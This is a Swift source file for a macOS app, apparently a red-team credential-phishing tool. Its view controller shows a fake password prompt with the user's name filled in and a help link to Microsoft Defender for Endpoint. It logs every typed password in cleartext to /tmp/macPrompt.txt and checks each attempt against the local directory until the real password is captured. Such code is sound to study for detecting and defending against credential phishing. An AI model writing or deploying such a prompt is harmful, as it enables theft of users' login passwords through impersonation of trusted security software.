import Foundation
import Cocoa
import OSAKit
import OpenDirectory

class WelcomeViewController: NSViewController {
    @IBOutlet weak var usernameField: NSTextField!
    @IBOutlet weak var passwordField: NSSecureTextField!
    @IBOutlet weak var allowButton: NSButton!
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        usernameField.stringValue = NSUserName()
        usernameField.isEditable = false
        usernameField.isEnabled = false
        passwordField.becomeFirstResponder()
        allowButton.keyEquivalent = "\r"
    }
    
    @IBAction func buttonPushed(_ sender: Any) {
        noteResult(result: "[!] attempting authentication: " + passwordField.stringValue + "\n")
        if checkInput() {
            self.view.window?.windowController?.close()
            self.view.window!.orderOut(nil)
            noteResult(result: "[+] authenticated!\n")
            sleep(1)
            exit(0)
        } else {
            self.view.window?.shakeWindow()
            //passwordField.stringValue = ""
        }
    }
    
    @IBAction func cancelButtonPushed(_ sender: Any) {
        self.view.window?.windowController?.close()
        self.view.window!.orderOut(nil)
        noteResult(result: "[-] cancelled!\n")
        sleep(1)
        exit(0)
    }
    
    @IBAction func helpButtonPushed(_ sender: Any) {
        NSWorkspace.shared.open(URL(string: "https://www.microsoft.com/en-us/security/business/endpoint-security/microsoft-defender-endpoint")!)
    }
    
    override var representedObject: Any? {
        didSet {
            // Update the view, if already loaded.
        }
    }
    
    func checkInput() -> Bool {
        do {
            let session = ODSession()
            let node = try ODNode(session: session, type: ODNodeType(kODNodeTypeLocalNodes))
            let record = try node.record(withRecordType: kODRecordTypeUsers, name: NSUserName(), attributes: nil)
            try record.verifyPassword(passwordField.stringValue)
            
            return true
        } catch {
            return false
        }
    }
    
    func noteResult(result: String) {
        let path = "/tmp/macPrompt.txt"
        let fileManager = FileManager.default
        if !fileManager.fileExists(atPath: path) {
            fileManager.createFile(atPath: path, contents: nil, attributes: nil)
        }
        
        let url = URL(fileURLWithPath: path)
        if let handle = try? FileHandle(forWritingTo: url) {
            handle.seekToEndOfFile() // moving pointer to the end
            handle.write(result.data(using: .utf8)!) // adding content
            handle.closeFile() // closing the file
        }
        
        /*
        do {
            //try result.write(toFile: "/tmp/macPrompt.txt", atomically: true, encoding: .utf8)
        } catch {
        }
        */
    }
}
